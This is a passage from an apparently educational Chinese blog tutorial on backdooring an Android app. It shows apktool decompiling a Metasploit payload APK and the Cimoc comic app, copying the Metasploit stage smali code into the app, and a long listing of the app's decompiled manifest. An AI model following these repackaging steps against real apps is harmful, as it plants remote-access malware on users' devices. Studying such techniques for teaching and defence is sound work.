file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624234521311.png"></p><p>这样后门程序就反编译完了，接下来要反编译我们需要的软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(gamernotitle㉿kali-vmware)-[~/apk]</span><br><span class="line">└─$ java -jar apktool_2.6.1.jar d -f -o original Cimoc.apk    </span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">I: Using Apktool 2.6.1 on Cimoc.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /home/gamernotitle/.local/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br></pre></td></tr></table></figure><p>接着把payload的文件弄到我们要注入的程序目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(gamernotitle㉿kali-vmware)-[~/apk]</span><br><span class="line">└─$ <span class="built_in">cp</span> payload/smali/com/metasploit/stage original/smali/com/metasploit/stage -r</span><br></pre></td></tr></table></figure><p>在软件反编译后的<code>AndroidManifest.xml</code>文件里面，会存放着软件的权限列表、活动列表等信息，在这里可以看到最开始启动了什么活动</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;29&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;10&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.hiroshi.cimoc&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;29&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.c2dm.permission.RECEIVE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:largeHeap</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.App&quot;</span> <span class="attr">android:requestLegacyExternalStorage</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.MainActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span> <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;adjustPan&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.ResultActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.DetailActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.ChapterActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.TagEditorActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.TaskActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.SettingsActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.settings.ReaderConfigActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.BackupActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.AboutActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.CategoryActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.SearchActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.SourceDetailActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.PartFavoriteActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.DirPickerActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;orientation|screenSize&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.settings.EventSettingsActivity&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;orientation|screenSize&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.PageReaderActivity&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;orientation|screenSize&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.StreamReaderActivity&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.service.DownloadService&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.BrowserFilter&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.NoDisplay&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.SEND&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">&quot;text/plain&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;cimoc&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.buka.cn&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.buka.cn&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.dm5.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.dm5.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;tel.dm5.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;tel.dm5.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;manhua.dmzj.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;manhua.dmzj.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.dmzj.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.dmzj.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.5qmh.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.5qmh.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.pufei.net&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.pufei.net&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;ac.qq.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;ac.qq.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.ac.qq.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.ac.qq.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.u17.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.u17.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.migudm.cn&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.migudm.cn&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.migudm.cn&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.migudm.cn&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;99770.hhxxee.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;99770.hhxxee.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.cartoonmad.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.cartoonmad.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.2animx.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.2animx.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.50mh.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.50mh.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.50mh.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.50mh.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.manhuadb.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.manhuadb.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.bnmanhua.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.bnmanhua.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.tohomh123.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.tohomh123.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.chuixue.net&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;www.chuixue.net&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.517manhua.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;m.517manhua.com&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.hiroshi.cimoc&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths_public&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:directBootAware</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.components.ComponentDiscoveryService&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.components:com.google.firebase.crashlytics.CrashlyticsRegistrar&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;com.google.firebase.components.ComponentRegistrar&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.components:com.google.firebase.remoteconfig.RemoteConfigRegistrar&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;com.google.firebase.components.ComponentRegistrar&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;com.google.firebase.components.ComponentRegistrar&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.components:com.google.firebase.abt.component.AbtRegistrar&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;com.google.firebase.components.ComponentRegistrar&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.components:com.google.firebase.iid.Registrar&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;com.google.firebase.components.ComponentRegistrar&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.gms.measurement.AppMeasurementReceiver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.gms.measurement.AppMeasurementInstallReferrerReceiver&quot;</span> <span class="attr">android:permission</span>=<span class="string">&quot;android.permission.INSTALL_PACKAGES&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.android.vending.INSTALL_REFERRER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.gms.measurement.AppMeasurementService&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span 